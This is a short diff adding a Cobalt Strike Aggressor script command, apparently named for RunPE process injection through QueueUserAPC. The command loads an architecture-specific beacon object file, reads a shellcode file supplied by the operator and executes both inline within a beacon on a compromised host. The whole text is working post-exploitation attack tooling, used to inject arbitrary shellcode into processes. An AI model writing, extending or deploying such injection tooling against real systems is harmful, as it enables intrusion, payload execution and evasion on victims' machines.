@@ -1,0 +1,19 @@
+alias RunPE_QueueUserAPC {
+	local('$barch $handle $data $args');
+
+	$barch  = barch($1);
+	
+	$handle = openf(script_resource("runpe_QUAPC/runpe_queueuserapc. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+    
+    $handle_to_shellcode = openf($4);
+    $sc_data   = readb($handle_to_shellcode, -1);
+    closef($handle_to_shellcode);
+	
+	$args   = bof_pack($1, "iZb", $2, $3, $sc_data);
+	
+	btask($1, "Executing RunPE_QueueUserAPC BOF");
+	
+	beacon_inline_execute($1, $data, "go", $args);
+}
